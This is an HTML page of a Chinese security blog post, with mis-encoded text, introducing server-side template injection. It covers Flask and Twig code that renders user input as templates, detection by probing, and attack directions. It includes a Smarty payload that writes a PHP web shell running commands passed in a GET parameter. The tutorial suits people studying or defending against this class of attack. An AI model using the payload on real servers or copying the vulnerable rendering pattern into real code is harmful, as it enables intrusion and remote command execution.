

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>SSTI(ä¸€) - Fearless&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"fearless0923.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Fearless's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="SSTI(ä¸€)">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-04-05 14:49" pubdate>
        April 5, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.5k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      56
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SSTI(ä¸€)</h1>
            
            <div class="markdown-body">
              <p><code>Server-Side-Template-Injection</code>ï¼ŒæœåŠ¡ç«¯æ¨¡ç‰ˆæ³¨å…¥æ”»å‡»ã€‚</p>
<p>æœåŠ¡ç«¯æ¨¡ç‰ˆå¼•æ“å°†ç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ¸²æŸ“è¿›æ¨¡ç‰ˆï¼Œè€Œæœªåšè¿‡æ»¤æˆ–è€…å¯¹è±¡å…³ç³»æ˜ å°„<code>(ORM)</code>ã€‚å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¸²æŸ“è¿›æ¨¡ç‰ˆçš„å†…å®¹ã€‚é€šè¿‡ç›´æ¥è¾“å…¥æ¨¡ç‰ˆæ¸²æŸ“çš„å…³é”®è¯ä¾‹å¦‚{ { } }ï¼Œå³å¯å°†æ¶æ„ä»£ç æ³¨å…¥æ¨¡ç‰ˆä¸­æ‰§è¡Œã€‚<br>
ç°åœ¨æœ€å¸¸è§çš„æ¨¡ç‰ˆæ¸²æŸ“å¼•æ“æ˜¯åŸºäºPythonçš„<code>Flask</code>æ¡†æ¶ï¼Œä½†æ˜¯æ¨¡æ¿æ³¨å…¥è¿˜å­˜åœ¨äºè®¸å¤šåœ°æ–¹ã€‚<code>ä¸ XSS ä¸åŒï¼Œæ¨¡æ¿æ³¨å…¥å¯ç”¨äºç›´æ¥æ”»å‡» Web æœåŠ¡å™¨çš„å†…éƒ¨ï¼Œå¹¶ç»å¸¸è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå°†æ¯ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºéƒ½è½¬å˜ä¸ºæ½œåœ¨çš„æ¢è½´ç‚¹ã€‚</code>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡.</p>
<h2 id="æ¨¡æ¿æ¸²æŸ“"><a class="header-anchor" href="#æ¨¡æ¿æ¸²æŸ“">ğŸ­</a>æ¨¡æ¿æ¸²æŸ“</h2>
<p>æ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰çš„ä¸€ç§å®ç°æ‰‹æ®µã€‚</p>
<h5 id="åç«¯æ¸²æŸ“"><a class="header-anchor" href="#åç«¯æ¸²æŸ“">ğŸ­</a>åç«¯æ¸²æŸ“</h5>
<p>æµè§ˆå™¨ç›´æ¥æ¥æ”¶ç»è¿‡æœåŠ¡å™¨è®¡ç®—(æœåŠ¡å™¨ç»è¿‡è§£æå­˜æ”¾åœ¨æœåŠ¡å™¨ç«¯çš„æ¨¡æ¿æ–‡ä»¶)ä¹‹åçš„å‘ˆç°ç»™ç”¨æˆ·çš„æœ€ç»ˆçš„HTMLå­—ç¬¦ä¸²ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨<strong>åªè¿›è¡Œäº†HTMLçš„è§£æ</strong>ï¼Œä»¥åŠé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„æ“çºµæ˜¾ç¤ºå™¨æ˜¾ç¤ºå†…å®¹çš„ç³»ç»Ÿè°ƒç”¨åœ¨æ˜¾ç¤ºå™¨ä¸ŠæŠŠHTMLæ‰€ä»£è¡¨çš„å›¾åƒæ˜¾ç¤ºç»™ç”¨æˆ·.</p>
<h5 id="å‰ç«¯æ¸²æŸ“"><a class="header-anchor" href="#å‰ç«¯æ¸²æŸ“">ğŸ­</a>å‰ç«¯æ¸²æŸ“</h5>
<p>æµè§ˆå™¨ä»åç«¯å¾—åˆ°ä¸€äº›ä¿¡æ¯(é€‚ç”¨äºangularjsçš„æ¨¡æ¿æ–‡ä»¶ï¼Œæˆ–æ˜¯JSONç­‰å„ç§æ•°æ®äº¤æ¢æ ¼å¼æ‰€åŒ…è£…çš„æ•°æ®ï¼Œåˆæ³•çš„HTMLå­—ç¬¦ä¸²)å°†è¿™äº›ä¿¡æ¯ç»„ç»‡æ’åˆ—å½¢æˆæœ€ç»ˆå¯è¯»çš„HTMLå­—ç¬¦ä¸²æ˜¯ç”±æµè§ˆå™¨æ¥å®Œæˆçš„ï¼Œåœ¨å½¢æˆäº†HTMLå­—ç¬¦ä¸²ä¹‹åï¼Œå†è¿›è¡Œæ˜¾ç¤º.</p>
<blockquote>
<blockquote>
<p>ä½¿ç”¨ render_template() æ–¹æ³•æ¥æ¸²æŸ“æ¨¡æ¿:å°†æ¨¡æ¿åå’Œä½ æƒ³ä½œä¸ºå…³é”®å­—çš„å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡</p>
</blockquote>
</blockquote>
<pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template

@app.route(<span class="hljs-string">&#x27;/hello/&#x27;</span>)
@app.route(<span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span>)
def hello(<span class="hljs-type">name</span>=<span class="hljs-keyword">None</span>):
     <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, <span class="hljs-type">name</span>=<span class="hljs-type">name</span>)</code></pre>
<blockquote>
<blockquote>
<p>render_templateå‡½æ•°æ¸²æŸ“çš„æ˜¯templatesä¸­çš„æ¨¡æ¿,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„htmlï¼Œé‡Œé¢çš„å‚æ•°éœ€è¦æˆ‘ä»¬æ ¹æ®æ¯ä¸ªç”¨æˆ·éœ€æ±‚ä¼ å…¥åŠ¨æ€å˜é‡ã€‚</p>
</blockquote>
</blockquote>
<h4 id="å¸¸è§æ¨¡æ¿å¼•æ“"><a class="header-anchor" href="#å¸¸è§æ¨¡æ¿å¼•æ“">ğŸ­</a>å¸¸è§æ¨¡æ¿å¼•æ“</h4>
<p><img src="/2021/04/05/wei/1.png" srcset="/img/loading.gif" alt="1"></p>
<p><em>PHPä¸­è¿˜æœ‰ä¸€ä¸ªBlade ï¼Œå®ƒå’Œå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ä¸ä¸€æ ·ï¼ŒBlade å¹¶ä¸é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿ PHP ä»£ç ã€‚æ‰€æœ‰ Blade è§†å›¾æ–‡ä»¶éƒ½å°†è¢«ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ï¼Œé™¤éå®ƒè¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç¼–è¯‘ã€‚</em></p>
<p><em>FreeMarkeræ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼š å³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬ï¼ˆHTMLç½‘é¡µã€ç”µå­é‚®ä»¶ã€é…ç½®æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰çš„é€šç”¨å·¥å…·ã€‚ å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚</em></p>
<h4 id="PHPå®ä¾‹"><a class="header-anchor" href="#PHPå®ä¾‹">ğŸ­</a>PHPå®ä¾‹</h4>
<p>å°†åç§°ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼š</p>
<pre><code class="hljs php">$output = $twig-&gt;render(<span class="hljs-string">&quot;Dear &#123;first_name&#125;,&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre>
<p>å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¿™äº›ç”µå­é‚®ä»¶ï¼ˆå¼€å‘è€…å°†ç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ”¾åœ¨è¦æ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸­ï¼‰ï¼š</p>
<pre><code class="hljs php">$output = $twig-&gt;render($_GET[<span class="hljs-string">&#x27;custom_email&#x27;</span>],  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre>
<p>ç”¨æˆ·é€šè¿‡custom_email GET å‚æ•°æ§åˆ¶æ¨¡æ¿æœ¬èº«çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¼ é€’ç»™æ¨¡æ¿çš„å€¼ã€‚</p>
<h4 id="pythonå®ä¾‹"><a class="header-anchor" href="#pythonå®ä¾‹">ğŸ­</a>pythonå®ä¾‹</h4>
<p>å…¸å‹flask:</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string
    app = Flask(__name__)
<span class="hljs-meta">    @app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
        template = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">            &lt;div class=&quot;center-content error&quot;&gt;</span>
<span class="hljs-string">                &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span>
<span class="hljs-string">                &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">            &lt;/div&gt; </span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span> %(request.url)  //ç¨‹åºå‘˜å› ä¸ºçœäº‹å¹¶ä¸ä¼šä¸“é—¨å†™ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œè€Œæ˜¯ç›´æ¥å½“å­—ç¬¦ä¸²æ¥æ¸²æŸ“ã€‚å¹¶ä¸”request.urlæ˜¯å¯æ§çš„
<span class="hljs-keyword">return</span> render_template_string(template)
    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
        app.debug = <span class="hljs-literal">True</span>
        app.run()</code></pre>
<p><code>render_template_string</code>å‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ä½¿ç”¨%såŠ¨æ€åœ°æ›¿æ¢å­—ç¬¦ä¸²ï¼ŒFlask ä¸­ä½¿ç”¨Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ{ { } }æ˜¯Jinja2çš„å˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{ { } }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{ {1+1} }ä¼šè¢«è§£ææˆ2ã€‚<strong>flaskåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ‰‹æ®µï¼ŒæŠ¥é”™404ï¼Œè¿”å›å½“å‰é”™è¯¯urlï¼Œé€šå¸¸CTFçš„flaskå¦‚æœæ˜¯sstiï¼Œé‚£ä¹ˆå…«ä¹ä¸ç¦»åå°±æ˜¯åŸºäºè¿™æ®µä»£ç ï¼Œå¤šçš„å°±æ˜¯ä¸€äº›è¿‡æ»¤å’Œä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„æ–¹æ³•å‡½æ•°ã€‚</strong></p>
<blockquote>
<p><strong>routeè£…é¥°å™¨è·¯ç”±</strong></p>
<p><code>@app.route('/')</code></p>
<blockquote>
<p>ä½¿ç”¨routeï¼ˆï¼‰è£…é¥°å™¨å‘Šè¯‰Flaskä»€ä¹ˆæ ·çš„URLå¯è§¦å‘å‡½æ•°.routeï¼ˆï¼‰è£…é¥°å™¨æŠŠä¸€ä¸ªå‡½æ•°ç»‘å®šåˆ°å¯¹åº”çš„URLä¸Šï¼Œè¿™å¥è¯ç›¸å½“äºè·¯ç”±ï¼Œä¸€ä¸ªè·¯ç”±è·Ÿéšä¸€ä¸ªå‡½æ•°ï¼Œå¦‚</p>
<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span>
<span class="hljs-string">return 123</span></code></pre>
<p>è®¿é—®localhost:5000/åˆ™ä¼šè¾“å‡º123ï¼Œä¿®æ”¹ä¸€ä¸‹:</p>
<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/test&#x27;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span>
<span class="hljs-string">return 123</span></code></pre>
<p>è¿™æ—¶å€™è®¿é—®localhost:5000/testä¼šè¾“å‡º123,æ­¤å¤–è¿˜å¯ä»¥è®¾ç½®åŠ¨æ€ç½‘å€:</p>
<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/hello/&lt;username&gt;&quot;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_user</span><span class="hljs-params">(username)</span></span><span class="hljs-symbol">:</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user:%s&quot;</span>%username</code></pre>
<p>æ ¹æ®urlé‡Œçš„è¾“å…¥ï¼ŒåŠ¨æ€è¾¨åˆ«èº«ä»½.ä¹Ÿå¯ä»¥ä½¿ç”¨intå‹ï¼Œè½¬æ¢å™¨æœ‰ä¸‹é¢å‡ ç§ï¼š</p>
<pre><code class="hljs ruby">int      æ¥å—æ•´æ•°
float    åŒ int ï¼Œä½†æ˜¯æ¥å—æµ®ç‚¹æ•°
path     å’Œé»˜è®¤çš„ç›¸ä¼¼ï¼Œä½†ä¹Ÿæ¥å—æ–œçº¿

@app.route(<span class="hljs-string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_post</span><span class="hljs-params">(post_id)</span></span><span class="hljs-symbol">:</span>
<span class="hljs-comment"># show the post with the given id, the id is an integer</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Post %d&#x27;</span> % post_id</code></pre>
</blockquote>
</blockquote>
<blockquote>
<p>mainå…¥å£</p>
<blockquote>
<p>å½“.pyæ–‡ä»¶è¢«ç›´æ¥è¿è¡Œæ—¶ï¼Œ<code>if name == â€˜mainâ€˜</code>ä¹‹ä¸‹çš„ä»£ç å—å°†è¢«è¿è¡Œï¼›å½“.pyæ–‡ä»¶ä»¥æ¨¡å—å½¢å¼è¢«å¯¼å…¥æ—¶ï¼Œ<code>if name ==  â€˜mainâ€˜</code>ä¹‹ä¸‹çš„ä»£ç å—ä¸è¢«è¿è¡Œå°è„šæœ¬ä¸éœ€è¦è¿™ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯å¦‚æœéœ€è¦åšä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„pythonå¼€å‘ï¼Œå†™ <code>if name ==â€™main__â€™  </code>æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ä¹ æƒ¯ï¼Œå¤§ä¸€ç‚¹çš„pythonè„šæœ¬è¦åˆ†å¼€å‡ ä¸ªæ–‡ä»¶æ¥å†™ï¼Œä¸€ä¸ªæ–‡ä»¶è¦ä½¿ç”¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—ï¼Œæ­¤æ—¶è¿™ä¸ªifå°±ä¼šèµ·åˆ°ä½œç”¨ä¸ä¼šè¿è¡Œè€Œæ˜¯ç±»ä¼¼äºæ–‡ä»¶åŒ…å«æ¥ä½¿ç”¨ã€‚</p>
</blockquote>
</blockquote>
<h4 id="æ£€æµ‹"><a class="header-anchor" href="#æ£€æµ‹">ğŸ­</a>æ£€æµ‹</h4>
<p>å‘ä¼ é€’çš„å‚æ•°ä¸­æ‰¿è½½ç‰¹å®š Payload  å¹¶æ ¹æ®è¿”å›çš„å†…å®¹æ¥è¿›è¡Œåˆ¤æ–­çš„ã€‚æ¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“éƒ½æœ‰ç€è‡ªå·±çš„è¯­æ³•ï¼ŒPayload çš„æ„é€ éœ€è¦é’ˆå¯¹å„ç±»æ¨¡æ¿å¼•æ“åˆ¶å®šå…¶ä¸åŒçš„æ‰«æè§„åˆ™ï¼Œå°±å¦‚åŒ SQL  æ³¨å…¥ä¸­æœ‰ç€ä¸åŒçš„æ•°æ®åº“ç±»å‹ä¸€æ ·ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ›´æ”¹è¯·æ±‚å‚æ•°ä½¿ä¹‹æ‰¿è½½å«æœ‰æ¨¡æ¿å¼•æ“è¯­æ³•çš„ Payloadï¼Œé€šè¿‡é¡µé¢æ¸²æŸ“è¿”å›çš„å†…å®¹æ£€æµ‹æ‰¿è½½çš„ Payload æ˜¯å¦æœ‰å¾—åˆ°ç¼–è¯‘è§£æã€‚ä¸¾ä¾‹ï¼š</p>
<p><img src="/2021/04/05/wei/3.jpg" srcset="/img/loading.gif" alt="3"></p>
<h2 id="æ”»å‡»"><a class="header-anchor" href="#æ”»å‡»">ğŸ­</a>æ”»å‡»</h2>
<h4 id="æ”»å‡»æ–¹å‘-ä¸€"><a class="header-anchor" href="#æ”»å‡»æ–¹å‘-ä¸€">ğŸ­</a>æ”»å‡»æ–¹å‘(ä¸€)</h4>
<ul>
<li>æ¨¡æ¿ï¼šè¯­æ³•ã€å†…ç½®å˜é‡ã€å±æ€§ã€å‡½æ•°</li>
<li>æ¡†æ¶ï¼šå…¨å±€å˜é‡ã€å±æ€§ã€å‡½æ•°</li>
<li>è¯­è¨€</li>
<li>åº”ç”¨</li>
</ul>
<h4 id="åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4>
<h5 id="Smarty"><a class="header-anchor" href="#Smarty">ğŸ­</a>Smarty</h5>
<p>Smartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function)ï¼Œä½†å®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty  è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„å¥½ç”¨çš„æ–¹æ³•ï¼Œå¦‚ï¼š</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fgithub.com%2Fsmarty-php%2Fsmarty%2Fblob%2Ffa269d418fb4d3687558746e67e054c225628d13%2Flibs%2Fsysplugins%2Fsmarty_internal_data.php%23L385&amp;r=https%3A%2F%2Fwww.k0rz3n.com%2F2018%2F11%2F12%2F%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E%2F%230X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">getStreamVariable()</a>å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµï¼ˆè¯»æ–‡ä»¶ï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a>(å†™æ–‡ä»¶)è¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªwriteFileæ–¹æ³•:</p>
<p><code>public function writeFile($_filepath, $_contents, Smarty $smarty)</code></p>
<p>ä½†ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª Smarty ç±»å‹</p>
<p><code>self::clearConfig()</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearConfig</span>(<span class="hljs-params">$varname = <span class="hljs-literal">null</span></span>)</span>
<span class="hljs-function"></span>&#123;
<span class="hljs-keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="hljs-keyword">$this</span>, $varname);
&#125;</code></pre>
<p>payload:</p>
<pre><code class="hljs php-template"><span class="xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> passthru($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;,self::clearConfig())&#125;</span></code></pre>
</blockquote>
<h5 id="Twig"><a class="header-anchor" href="#Twig">ğŸ­</a>Twig</h5>
<p>ç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¸èƒ½ä½¿ç”¨ <code>self::</code> è°ƒç”¨é™æ€å˜é‡äº†ï¼Œä½†æŸ¥è¯¢<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">å®˜æ–¹æ–‡æ¡£</a>:</p>
<p><img src="/2021/04/05/wei/4.png" srcset="/img/loading.gif" alt="4"></p>
